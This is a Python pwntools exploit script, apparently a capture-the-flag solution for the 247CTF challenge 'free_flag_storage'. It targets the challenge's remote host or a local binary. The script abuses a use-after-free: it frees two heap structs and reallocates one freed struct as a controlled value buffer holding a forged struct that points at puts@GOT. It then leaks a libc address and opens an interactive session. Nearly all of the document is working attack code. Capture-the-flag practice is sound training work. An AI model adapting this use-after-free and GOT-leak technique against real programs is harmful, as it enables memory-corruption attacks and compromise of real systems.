#!/usr/bin/env python3
"""
UAF Exploit v3 for free_flag_storage - 247CTF

Better strategy:
1. Create flag0 (8b), flag1 (8b)
2. Delete flag0, delete flag1 - both go to fastbin
3. Add flag2 (16b) - struct from fastbin gets one old struct
                   - value (16b = 24byte chunk) gets ANOTHER old struct!
4. flags[0] or flags[1] (dangling) points to what is now flag2's value buffer
5. Writing flag2's value = writing to the old struct location
6. Accessing via dangling pointer reads our controlled struct -> leak!
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    if args.GDB:
        return gdb.debug('./free_flag_storage', '''
            set pagination off
            b *0x8048ba9
            c
        ''')
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

# Step 1: Create two flags
log.info("Step 1: Create flag0(8b), flag1(8b)")
add(8, b'AAAAAAAA', 1, 11)
add(8, b'BBBBBBBB', 2, 22)
log.info(show().decode())

# Step 2: Delete both - creates 2 dangling pointers
log.info("Step 2: Delete flag1, then flag0")
delete(1)  # fastbin-24: struct1, fastbin-16: value1
delete(0)  # fastbin-24: struct0->struct1, fastbin-16: value0->value1
# flags[0]->struct0 (freed), flags[1]->struct1 (freed)

# Step 3: Add flag2 with 16-byte value (= 24-byte chunk like struct!)
log.info("Step 3: Add flag2 with 16-byte value")
log.info("  malloc(struct) gets struct0, malloc(value) gets struct1!")

# This value becomes struct1's content (which flags[1] points to!)
fake_struct = p32(16) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
add(16, fake_struct, 3, 33)

# Now: flag2 uses struct0 for its struct, struct1 for its value
# flags[0] -> struct0 = flag2's actual struct
# flags[1] -> struct1 = flag2's value buffer (our fake struct!)

log.info("Step 4: Show output - flag1's value_ptr should be puts@GOT")
data = show()
log.info(f"Raw output: {data}")

# Look for libc address in the output
for line in data.split(b'\n'):
    if b'247CTF{' in line:
        # Extract content between { and }
        start = line.find(b'{')
        end = line.find(b'}')
        if start != -1 and end != -1:
            content = line[start+1:end]
            log.info(f"Flag content ({len(content)} bytes): {content.hex()}")
            if len(content) >= 4:
                leaked = u32(content[:4])
                log.success(f"Leaked address: {hex(leaked)}")

p.interactive()
